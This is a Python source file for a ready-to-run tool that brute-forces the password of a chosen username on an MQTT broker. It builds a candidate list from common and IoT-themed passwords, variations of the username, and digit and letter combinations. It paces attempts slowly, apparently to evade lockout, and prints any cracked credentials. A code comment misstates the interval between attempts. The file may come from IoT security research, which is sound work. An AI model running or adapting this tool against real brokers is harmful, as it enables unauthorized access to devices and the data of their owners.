#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import threading
import argparse
import itertools
import string
import ssl
import os
import json
from datetime import datetime, timezone
import math

class SingleUserSlowBruteForceAttack:
    def __init__(self, broker_host="localhost", broker_port=1883, 
                 use_tls=False, ca_certs="certs/ca-cert.pem", insecure=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.use_tls = use_tls
        self.ca_certs = ca_certs
        self.insecure = insecure
        self.cracked_password = None
        self.attack_stats = {
            "password_attempts": 0,
            "successful_logins": 0,
            "failed_logins": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None,
            "packets_per_minute": 4
        }
        self.lock = threading.Lock()
        self.last_attempt_time = 0
        self.min_interval = 60.0 / 4  # 1.5 seconds between attempts
        
    def _print_cert_status(self):
        """Print TLS certificate configuration status"""
        if self.use_tls:
            print(f"  TLS Enabled: Yes")
            if self.ca_certs:
                print(f"  Using CA file (Hardcoded/Default): {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
            else:
                print("  No CA file provided; will use system CA store (if available).")
            print(f"  Insecure mode (skip verification): {self.insecure}")
        else:
            print(f"  TLS Enabled: No")

    def create_client(self, client_id, username=None, password=None):
        """Create MQTT client with proper TLS configuration"""
        try:
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            
            if self.use_tls:
                
                if self.ca_certs and os.path.exists(self.ca_certs):
                    client.tls_set(ca_certs=self.ca_certs,
                                   cert_reqs=ssl.CERT_REQUIRED,
                                   tls_version=ssl.PROTOCOL_TLS_CLIENT,
                                   ciphers=None)
                else:
                    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                    if self.insecure:
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    client.tls_set_context(ctx)

                if self.insecure:
                    try:
                        client.tls_insecure_set(True)
                    except Exception:
                        pass
            
            if username and password:
                client.username_pw_set(username, password)
            
            return client
        except Exception as e:
            # print(f" Error creating client {client_id}: {e}")
            return None
    
    def enforce_rate_limit(self):
        """Enforce rate limit of N packets per minute"""
        current_time = time.time()
        time_since_last_attempt = current_time - self.last_attempt_time
        
        if time_since_last_attempt < self.min_interval:
            sleep_time = self.min_interval - time_since_last_attempt
            if sleep_time > 0:
                time.sleep(sleep_time)
        
        self.last_attempt_time = time.time()
    
    def generate_password_list(self, username, min_length=4, max_length=8, custom_passwords=None):
        """Generate password combinations optimized for the specific username"""
        passwords = []
        
        if custom_passwords:
            passwords.extend(custom_passwords)
        
        username_parts = username.split('-')
        base_words = []
        for part in username_parts:
            clean_part = ''.join([c for c in part if not c.isdigit()])
            if clean_part and len(clean_part) > 2:
                base_words.append(clean_part)
        
        common_passwords = [
            "admin123", "admin", "password", "123456", "qwerty", "letmein", "welcome",
            "monkey", "1234567890", "abc123", "Password1", "password1",
            "root", "toor", "pass", "test", "user", "guest", "demo",
            
            "mqtt", "emqx", "broker", "iot", "factory", "sensor", "device", "sensor123",
            "production", "security", "energy", "office", "storage", 
            "predictive", "fan", "air", "hum", "distance", "smoke", "co",
            "replayer", "sensor_door", "sensor_smoke", "sensor_co", "cooler", "flamel",
            
            "1234", "0000", "1111", "2222", "3333", "4444", "5555",
            "6666", "7777", "8888", "9999", "00000", "11111", "12345",
            "12345678", "123456789", "987654321", 
        ]
        
        for pwd in common_passwords:
            if pwd not in passwords:
                passwords.append(pwd)
        
        for word in base_words:
            if word not in passwords:
                passwords.append(word)
            
            patterns = [
                word, word + "123", word + "456", word + "789",
                word + "1", word + "2", word + "3",
                "123" + word, "456" + word, word + "!", word + "@123"
            ]
            
            for pattern in patterns:
                if pattern not in passwords and len(pattern) >= min_length:
                    passwords.append(pattern)
        
        username_variations = [
            username,
            username.replace("-", ""),
            username.replace("-", "_"),
            username + "123",
            username + "!",
            username[:8], 
            username[-8:], 
        ]
        
        for variation in username_variations:
            if variation not in passwords and len(variation) >= min_length:
                passwords.append(variation)
        
        for length in range(min_length, max_length + 1):
            for combo in itertools.product('0123456789', repeat=length):
                pwd = ''.join(combo)
                if pwd not in passwords:
                    passwords.append(pwd)
                if len(passwords) > 1500:
                    break
            if len(passwords) > 1500:
                break
        
        chars = string.ascii_lowercase + string.digits
        for length in range(min_length, min(max_length, 6) + 1):
            for combo in itertools.product(chars, repeat=length):
                pwd = ''.join(combo)
                if pwd not in passwords:
                    passwords.append(pwd)
                if len(passwords) > 2000:
                    break
            if len(passwords) > 2000:
                break
        
        return passwords[:2000] 
    
    def brute_force_single_user(self, username, password_list):
        """Slow brute-force a single username with rate limiting"""
        print(f" Starting SLOW brute-force for username: {username}")
        print(f" Total passwords to try: {len(password_list)}")
        print(f" Rate limit: {self.attack_stats['packets_per_minute']} packets/minute")
        print(f" Interval between attempts: {self.min_interval:.2f} seconds")
        print(f" First 10 passwords: {password_list[:10]}")
        print("-" * 50)
        
        estimated_time = len(password_list) * self.min_interval / 60
        print(f" Estimated completion time: {estimated_time:.1f} minutes")
        
        for password_idx, password in enumerate(password_list):
            if self.cracked_password:
                return True
            
            # Enforce rate limit before each attempt
            self.enforce_rate_limit()
                
            client_id = f"attack_slow_{username}"
            
            try:
                client = self.create_client(client_id, username, password)
                if not client:
                    with self.lock:
                        self.attack_stats["connections_failed"] += 1
                    continue
                
                connection_result = {"success": False, "rc": None}
                
                def on_connect(client, userdata, flags, rc, properties=None):
                    connection_result["rc"] = rc
                    if rc == 0:
                        connection_result["success"] = True
                        with self.lock:
                            print(f"\n🎉 SUCCESS! Username: {username}, Password: {password}")
                            self.cracked_password = password
                            self.attack_stats["successful_logins"] += 1
                    else:
                        with self.lock:
                            self.attack_stats["failed_logins"] += 1
                
                client.on_connect = on_connect
                
                try:
                    client.connect(self.broker_host, self.broker_port, 10)
                    client.loop_start()
                    
                    timeout = 3
                    start_time = time.time()
                    while time.time() - start_time < timeout:
                        if connection_result["rc"] is not None:
                            break
                        time.sleep(0.1)
                    
                    client.loop_stop()
                    client.disconnect()
                    
                    with self.lock:
                        self.attack_stats["password_attempts"] += 1
                    
                    if connection_result["success"]:
                        return True
                    else:
                        if password_idx % 10 == 0 and password_idx > 0:
                            progress = (password_idx + 1) / len(password_list) * 100
                            remaining_time = (len(password_list) - password_idx) * self.min_interval / 60
                            print(f" Progress: {password_idx+1}/{len(password_list)} ({progress:.1f}%) - "
                                  f"Est. remaining: {remaining_time:.1f} minutes")
                            
                except Exception as e:
                    with self.lock:
                        self.attack_stats["failed_logins"] += 1
                        self.attack_stats["password_attempts"] += 1
                    
                    if "Connection refused" in str(e) or "Network is unreachable" in str(e):
                        print(f" Connection error - {e}")
                        return False
                    elif "Name or service not known" in str(e):
                        print(f" Cannot resolve broker hostname - {e}")
                        return False
                
            except Exception as e:
                # print(f" Error with password {password}: {e}")
                with self.lock:
                    self.attack_stats["failed_logins"] += 1
                continue
        
        print(f" Completed {username} - password not found")
        return False
    
    def launch_attack(self, username, min_password_length=4, max_password_length=6, 
                     custom_passwords=None, password_file=None, packets_per_minute=4):
        """Launch slow brute-force password cracking attack for a single username"""
        # Update rate limit based on parameter
        self.attack_stats["packets_per_minute"] = packets_per_minute
        self.min_interval = 60.0 / packets_per_minute
        
        print(f"🚀 Starting SLOW Brute-force Attack for Single User (CA Hardcoded)")
        print(f"   Target: {self.broker_host}:{self.broker_port}")
        print(f"   Username: {username}")
        print(f"   Rate limit: {packets_per_minute} packets/minute")
        print(f"   Interval: {self.min_interval:.2f} seconds between attempts")
        print(f"   Password length: {min_password_length}-{max_password_length}")
        self._print_cert_status()
        print("=" * 60)
        
        self.attack_stats["start_time"] = time.time()
        self.last_attempt_time = time.time() - self.min_interval  # Initialize for first attempt
        
        loaded_passwords = []
        if password_file and os.path.exists(password_file):
            try:
                with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                    loaded_passwords = [line.strip() for line in f if line.strip()]
                print(f" Loaded {len(loaded_passwords)} passwords from {password_file}")
            except Exception as e:
                print(f" Error loading password file: {e}")
        
        all_custom_passwords = []
        if custom_passwords:
            all_custom_passwords.extend(custom_passwords)
        if loaded_passwords:
            all_custom_passwords.extend(loaded_passwords)
        
        print(" Phase 1: Generating password list...")
        password_list = self.generate_password_list(
            username, min_password_length, max_password_length, all_custom_passwords
        )
        print(f" Generated {len(password_list)} passwords to try")
        
        print("\n Phase 2: Starting slow brute-force...")
        success = self.brute_force_single_user(username, password_list)
        
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats(username, success)
        
        return success
    
    def print_attack_stats(self, username, success):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        minutes = duration / 60
        
        print("\n" + "=" * 60)
        print(" SLOW BRUTE-FORCE ATTACK RESULTS")
        print("=" * 60)
        print(f"Username: {username}")
        print(f"Duration: {minutes:.2f} minutes ({duration:.2f} seconds)")
        print(f"Password attempts: {self.attack_stats['password_attempts']}")
        print(f"Successful logins: {self.attack_stats['successful_logins']}")
        print(f"Failed logins: {self.attack_stats['failed_logins']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Packets per minute: {self.attack_stats['packets_per_minute']}")
        
        if success and self.cracked_password:
            print(f"\n🎯 CRACKED: {username}:{self.cracked_password}")
            print("=" * 4)
        else:
            print(f"\n❌ FAILED: Password not found for {username}")
        
        if self.attack_stats['password_attempts'] > 0:
            success_rate = (self.attack_stats['successful_logins'] / 
                           self.attack_stats['password_attempts'] * 100)
            print(f"Success rate: {success_rate:.1f}%")
        
        if duration > 0:
            actual_rate = self.attack_stats['password_attempts'] / minutes
            print(f"Actual attempts per minute: {actual_rate:.1f}")
            print(f"Target attempts per minute: {self.attack_stats['packets_per_minute']}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Single User Slow Brute-force (CA Hardcoded)")
    
    parser.add_argument("--broker", required=True, help="MQTT broker host (required)")
    parser.add_argument("--target-username", required=True, help="Target username to crack (required)")
    
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--min-length", type=int, default=4, help="Minimum password length")
    parser.add_argument("--max-length", type=int, default=6, help="Maximum password length")
    parser.add_argument("--packets-per-minute", type=int, default=4, 
                       help="Rate limit: packets per minute (default: 4)")
    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
    
    parser.add_argument("--ca", default="certs/ca-cert.pem", help="Path to CA certificate file (Default: certs/ca-cert.pem)")
    parser.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")
    parser.add_argument("--password-file", help="File containing passwords to try (one per line)")
    parser.add_argument("--custom-passwords", nargs="+", help="Custom passwords to try")
    
    args = parser.parse_args()
    
    attack = SingleUserSlowBruteForceAttack(
        broker_host=args.broker,
        broker_port=args.port,
        use_tls=args.tls,
        ca_certs=args.ca,
        insecure=args.insecure
    )
    
    attack.launch_attack(
        username=args.target_username,
        min_password_length=args.min_length,
        max_password_length=args.max_length,
        custom_passwords=args.custom_passwords,
        password_file=args.password_file,
        packets_per_minute=args.packets_per_minute
    )

if __name__ == "__main__":
    main()
